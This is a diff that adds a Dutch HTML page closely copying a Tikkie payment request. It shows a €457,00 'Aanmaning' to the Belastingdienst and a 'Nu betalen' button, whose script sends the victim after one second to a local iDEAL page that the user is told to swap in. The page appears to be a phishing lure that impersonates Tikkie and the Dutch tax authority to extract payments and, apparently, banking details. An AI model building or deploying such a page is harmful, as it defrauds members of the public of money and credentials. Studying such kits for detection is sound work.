@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Betaalverzoekjes via Tikkie</title>
+    <link rel="stylesheet" href="tikkie.css">
+    <link rel="icon" type="image/png" href="tikkie logo's/favicon.png">
+</head>
+<body>
+    <header class="header">
+        <span class="betaal-text"><b>Betaal via</b></span>
+        <img src="tikkie logo's/logo-tikkie.png" alt="Tikkie Logo" class="logo">
+    </header>
+    
+    <main class="container">
+        <h1>Aanmaning</h1>
+        <div class="belastingdienst-container">
+            <span class="belastingdienst-text"><b>Naar Belastingdienst</b></span>
+            <div class="checkmark-logo">
+                <img src="tikkie logo's/checkmark.svg" alt="Checkmark Logo">
+            </div>
+        </div>
+        
+        <h1 class="prijs">€ 457,00</h1>
+        
+        <div class="add-message"><b>+ Berichtje toevoegen?</b></div>
+        
+        <a href="#" class="btn" id="payButton">
+            <img src="tikkie logo's/ideal-logo.svg" alt="iDEAL Logo" class="btn-icon">
+            <b>Nu betalen</b>
+        </a>
+        
+        <div class="voorwaarden">
+            <p class="grijs"><b>Door Tikkie te gebruiken ga je akkoord met de</b></p>
+            <p class="wit"><b>Algemene voorwaarden</b></p>
+        </div>
+    </main>
+    
+    <section class="questions">
+        <p><b>Heb je nog vragen?</b></p>
+    </section>
+    
+    <section class="faq">
+        <div class="how-it-works"><p><b>Hoe werkt het?</b></p><img src="tikkie logo's/arrow-down-white.svg" alt="Pijl"></div>
+        <div class="how-it-works"><p><b>Is Tikkie voor iedereen?</b></p><img src="tikkie logo's/arrow-down-white.svg" alt="Pijl"></div>
+        <div class="how-it-works"><p><b>Is Tikkie veilig?</b></p><img src="tikkie logo's/arrow-down-white.svg" alt="Pijl"></div>
+        <div class="how-it-works"><p><b>Heb ik mijn paslezer nodig om te betalen?</b></p><img src="tikkie logo's/arrow-down-white.svg" alt="Pijl"></div>
+        <div class="how-it-works"><p><b>Is het gratis?</b></p><img src="tikkie logo's/arrow-down-white.svg" alt="Pijl"></div>
+        <div class="how-it-works"><p><b>Waarom zie ik een onbekende rekening?</b></p><img src="tikkie logo's/arrow-down-white.svg" alt="Pijl"></div>
+        <div class="how-it-works"><p><b>Misbruik melden</b></p><img src="tikkie logo's/arrow-down-white.svg" alt="Pijl"></div>
+    </section>
+    
+    <section class="questions">
+        <p><b>Kom je er niet uit?</b></p>
+    </section>
+    
+    <button type="button" class="btn">
+        <img src="tikkie logo's/chat.png" alt="Chat Icon" class="btn-icon">
+        <b>App met Tikkie</b>
+    </button>
+    
+    <footer class="footer">
+        <div class="footer-left">
+            <span><b>Algemene Voorwaarden</b></span>  
+            <span><b>Privacy</b></span>
+        </div>
+        <div class="footer-right">
+            <span><b>&copy; Tikkie</b></span>
+        </div>
+    </footer>
+    
+    <script>
+        document.getElementById("payButton").addEventListener("click", function(e) {
+            e.preventDefault();  // Zorgt ervoor dat de knop niet meteen de pagina verandert
+            
+            // Voeg een vertraging van 1 seconde toe
+            setTimeout(function() {
+                window.location.href = "ideal.html";  // Vervang met de URL van je iDEAL-pagina
+            }, 1000);  // 1000 milliseconden = 1 seconde
+        });
+    </script>
+</body>
+</html>
